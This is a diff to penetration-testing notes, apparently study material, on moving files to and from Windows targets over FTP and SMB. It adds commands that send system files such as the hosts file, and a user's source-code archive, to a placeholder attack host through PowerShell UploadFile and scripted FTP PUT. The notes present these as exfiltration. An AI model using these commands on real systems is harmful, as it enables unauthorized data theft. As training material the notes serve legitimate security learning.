@@ -27,19 +27,19 @@
 				- `copy n:\file` on the target device. 
 			- Without `-user` and `-password`, no need to mount. `copy \\<ip>\share\file`.
 	- ##### FTP
-		-  Configure an `FTP` server on our device with Python module `pyftpdlib`.
+		- Configure an `FTP` server on our device with Python module `pyftpdlib`.
 			- `sudo pip3 install pyftpdlib`
 			- By default, `pyftpdlib` uses port `2121`.
 			- Start the server using `sudo python3 -m pyftpdlib --port 21`
-			- Using PowerShell
-				- `(New-Object Net.WebClient).DownloadFile('ftp://<ip>/file', '<to path>'`
-				- In case **Non-Interactive Shell**, create an FTP command file to download a file.
-					- `echo open <ip> > ftpcommand.txt`
-					- `echo USER anonymous >> ftpcommand.txt`
-					- `echo binary >> ftpcommand.txt`
-					- `echo GET file.txt >> ftpcommand.txt`
-					- `echo bye >> ftpcommand.txt`
-					- `ftp -v -n -s:ftpcommand.txt`
+		- Using PowerShell
+			- `(New-Object Net.WebClient).DownloadFile('ftp://<ip>/file', '<to path>'`
+			- In case **Non-Interactive Shell**, create an FTP command file to download a file.
+				- `echo open <ip> > ftpcommand.txt`
+				- `echo USER anonymous >> ftpcommand.txt`
+				- `echo binary >> ftpcommand.txt`
+				- `echo GET file.txt >> ftpcommand.txt`
+				- `echo bye >> ftpcommand.txt`
+				- `ftp -v -n -s:ftpcommand.txt`
 - ### *Upload*
 	- Used in situations such as password cracking, analysis, exfiltration, etc.
 	- ##### PowerShell Base64 Encode & Decode
@@ -74,3 +74,15 @@
 		- Copy the file using `copy C:\Users\john\Desktop\SourceCode.zip \\<attack-ip>\DavWWWRoot\` or `copy C:\Users\john\Desktop\SourceCoce.zip \\<attack-ip>\sharefolder\`.
 		- If there are no SMB (TCP/445) restrictions, `impacket-smbserver` the same way we set it up for download operations.
 	- ##### FTP Uploads
+		- Use PowerShell or the FTP client to complete the operation.
+		- **Configuring FTP Server**
+			- Install module using `sudo pip3 install pyftpdlib`.
+			- Start the server using `sudo python3 -m pyftpdlib --port 21 --write`, `--write` is to allow clients to upload files to our attack host.
+		- Use `(New-Object Net.WebClient).UploadFile('ftp://<attack-ip>/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')`.
+		- In case **Non-Interactive Shell**, create an FTP command file to download a file.
+			- `echo open <ip> > ftpcommand.txt`
+			- `echo USER anonymous >> ftpcommand.txt`
+			- `echo binary >> ftpcommand.txt`
+			- `echo PUT C:\Windows\System32\drivers\etc\hosts >> ftpcommand.txt`
+			- `echo bye >> ftpcommand.txt`
+			- `ftp -v -n -s:ftpcommand.txt`
